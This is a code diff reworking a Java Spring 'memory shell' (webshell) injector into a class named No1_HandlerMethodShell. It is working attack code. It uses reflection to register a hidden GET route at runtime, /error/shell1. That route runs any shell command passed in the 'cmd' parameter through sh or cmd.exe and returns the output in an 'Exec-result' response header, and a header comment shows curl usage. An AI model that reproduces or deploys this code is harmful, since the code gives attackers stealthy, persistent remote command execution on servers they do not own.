@@ -1,10 +1,7 @@
-package com.example.springshell;
+package com.example.springshell.memshell;
 
 import jakarta.servlet.http.HttpServletRequest;
 import jakarta.servlet.http.HttpServletResponse;
-import org.springframework.stereotype.Controller;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.context.WebApplicationContext;
 import org.springframework.web.context.request.RequestContextHolder;
@@ -24,19 +21,17 @@ import java.util.Scanner;
 /**
  *  No error inject:
  <ol>
- <li>curl http://127.0.0.1:8080/inject?injectPath=/error/ikun</li>
+ <li>curl http://127.0.0.1:8080/exec?injectPath=/error/ikun</li>
  <li>curl http://127.0.0.1:8080/error/ikun?cmd=whoami</li>
  </ol>
  * @Version v5.3.0-M1 -> v6.1.1
  * @author jeyiuwai
  */
 
-@Controller
-@RequestMapping("/inject")
-public class InjectController {
-
-    @GetMapping
-    public void inject(HttpServletRequest request, HttpServletResponse response) throws InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+public class No1_HandlerMethodShell {
+    public static String injectShell() throws InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+        HttpServletRequest request =  ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
         try {
             // get mappingHandlerMapping
             WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
@@ -77,15 +72,15 @@ public class InjectController {
             }
 
             // 注入 Webshell 的路径
-            String injectPath= request.getParameter("injectPath");
-//            String injectPath= "/error/ikun";
+//            String injectPath= request.getParameter("injectPath");
+            String injectPath= "/error/shell1";
             PathPatternsRequestCondition pathPatternsRequestCondition = new PathPatternsRequestCondition(new PathPatternParser(), injectPath);
 
             RequestMappingInfo mapping = (RequestMappingInfo) requestMappingInfoConstructor
                     .newInstance(null,
                             pathPatternsRequestCondition,
                             null,
-                            new RequestMethodsRequestCondition(),
+                            new RequestMethodsRequestCondition(RequestMethod.GET),
                             new ParamsRequestCondition(),
                             new HeadersRequestCondition(),
                             new ConsumesRequestCondition(),
@@ -95,53 +90,49 @@ public class InjectController {
                     );
 
             // 1.2 - handler
-            EvilController handler = new EvilController();
+            No1_HandlerMethodShell handler = new No1_HandlerMethodShell();
 
             // 1.3 - method
             try {
-                Method method = EvilController.class.getMethod("evilMethod");
+                Method method = No1_HandlerMethodShell.class.getMethod("evilMethod");
                 // *2* - register Mapping
                 mappingHandlerMapping.registerMapping(mapping, handler, method);
-                response.getWriter().println("inject success!");
+//                response.getWriter().println("inject success!");
+                return "{\"result\":\"No1_HandlerMethodShell_success\"}";
             } catch (NoSuchMethodException e) {
 //                throw new RuntimeException(e);
             }
         }catch (IllegalStateException e) {
             // 处理重复注入的报错
 //            e.printStackTrace();
-            response.getWriter().println("injected already!");
+//            response.getWriter().println("injected already!");
+            return "{\"result\":\"No1_HandlerMethodShell_already\"}";
         }
-
+        return "{\"result\":\"No1_HandlerMethodShell\"}";
     }
 
-    public class EvilController {
-        public EvilController() {
-        }
-
-        public void evilMethod() {
-            try {
-                HttpServletRequest request =  ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
-                HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
-                if (request.getParameter("cmd") != null) {
-                    boolean isLinux = true;
-                    String osTyp = System.getProperty("os.name");
-                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-                        isLinux = false;
-                    }
-                    String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
-                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-                    Scanner s = new Scanner(in).useDelimiter("\\A");
-                    String output = s.hasNext() ? s.next() : "";
-                    response.getWriter().write(output);
-                    response.getWriter().flush();
-                    response.getWriter().close();
+    public void evilMethod() {
+        try {
+            HttpServletRequest request =  ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
+            if (request.getParameter("cmd") != null) {
+                boolean isLinux = true;
+                String osTyp = System.getProperty("os.name");
+                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+                    isLinux = false;
                 }
-
-            }catch (Exception e) {
-                System.out.println("here3");
+                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
+                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                Scanner s = new Scanner(in).useDelimiter("\\A");
+                String output = s.hasNext() ? s.next() : "";
+//                response.getWriter().write(output);
+//                response.getWriter().flush();
+//                response.getWriter().close();
+                response.setHeader("Exec-result", new String(output));
             }
-        }
 
+        }catch (Exception e) {
+            System.out.println("here3");
+        }
     }
 }
-
